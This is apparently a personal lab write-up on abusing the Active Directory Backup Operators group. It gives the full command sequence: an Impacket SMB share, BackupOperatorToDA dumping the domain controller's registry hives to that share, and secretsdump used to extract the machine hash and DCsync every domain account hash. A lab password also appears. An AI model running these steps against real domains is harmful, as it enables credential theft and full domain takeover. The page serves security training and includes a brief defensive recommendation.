# Backup Operators

## Configuring

### Prerequisite&#x20;

The membership of the "Backup Operators" group is configured in the Dumping DPAPI page.

{% content-ref url="../../misc/page-3.md" %}
[page-3.md](../../misc/page-3.md)
{% endcontent-ref %}

## Attacking

### How it works

The Backup Operators group is a built in group in AD. By default it has no members.

Members of the Backup Operators group can back up and restore all files on a computer, regardless of the permissions that protect those files. Backup Operators also can log on to and shut down the computer. This group cannot be renamed, deleted, or moved. They also have the permissions needed to replace files (including operating system files) on domain controllers.

One of the known attacks is to copy the ntds.dit file and extract all the domain credentials from it.

{% hint style="info" %}
I wasn't able to copy the `ntds.dit` file. There are some write-ups such as [these](https://coldfusionx.github.io/posts/Blackfield-HTB/) describing how to abuse the "Backup Operator" group through making a shadow copy, but these require winrm access to the DC.&#x20;

In my attack we will use the tool BackupOperatorToDA from [mpgn](https://github.com/mpgn/BackupOperatorToDA).
{% endhint %}

### Tools

* [Smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)
* [BackupOperatorToDA.exe](https://github.com/mpgn/BackupOperatorToDA)

### Executing the attack

#### The small stuff

* Login to the DC locally (Not through RDP but only locally):

![](<../../../.gitbook/assets/image (22) (1).png>)

* List files on the Domain Controller:

![](<../../../.gitbook/assets/image (17) (1) (1).png>)

* Copy files from the Domain Controller:

![](<../../../.gitbook/assets/image (67) (1) (1).png>)

#### To Domain Admin!

From our enumeration when we gained access to the `sa_backup` account we know the user is part of the Backup Operators group. We can abuse the permissions by making a copy of the SAM, SYSTEM and SECURITY hive, extract the machine account hash and then execute a DCsync attack.

1. Login to `DATA01` as `sa_backup` with the password `LS6RV5o8T9`.
2. Run the following command to check if the `sa_backup` user is member of the `Backup Operators` group.

![](<../../../.gitbook/assets/image (19) (1).png>)

3\. One of the requirements is to host a public SMB share, we can do this with the smbserver.py script from Impacket. This will create a share on `\\192.168.248.2\share`.

```
python3 /opt/impacket/examples/smbserver.py share ~/adlab -smb2support
```

![](<../../../.gitbook/assets/image (71) (1) (1) (1) (1) (1).png>)

4\. The next step is to execute the BackupOperatorToDa.exe tool to retrieve the the SAM, SYSTEN and SECURITY HIVE and save them in our created public share:

```
.\BackupOperatorToDA.exe -t \\dc03.secure.local -u sa_backup -p LS6RV5o8T9 -d secure.local -o \\192.168.248.2\share\
```

![](<../../../.gitbook/assets/image (68) (1) (1).png>)

{% hint style="info" %}
If you are using another share, make sure the share is writeable by anyone otherwise the DC won't be able to write its files.
{% endhint %}

5\. If we check in our directory `~/adlab` we can see the files: (for the screenshot I made a copy in the HIVE directory)

![](<../../../.gitbook/assets/image (73) (1) (1) (1).png>)

6\. The next step is to run SecretDump.py to retrieve the machine account NTLM hash out of these HIVE dumps:

```
secretsdump.py LOCAL -system ~/adlab/SYSTEM -security ~/adlab/SECURITY -sam ~/adlab/SAM
```

![](<../../../.gitbook/assets/image (53).png>)

7\. The last step is to run Secretsdump.py to run DCsync and retrieve all the domain account hashes:

```
secretsdump.py 'secure.local/dc03$'@dc03.secure.local -hashes aad3b435b51404eeaad3b435b51404ee:ba6414d4e6ce546465b256950282c7f3
```

![](<../../../.gitbook/assets/image (18) (1) (1) (1).png>)

We retrieved the NTLM account hash of every user in the domain and could authenticate with these to the domain controller. As Administrator for example which is Domain Admin.

## Defending

### Recommendations

* Never use any of the "Operator" groups. Create specialised groups and minimal permissions for the tasks the different IT departments/roles need. Use the least privilege principal.

### Detection



## References

{% embed url="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#account-operators" %}

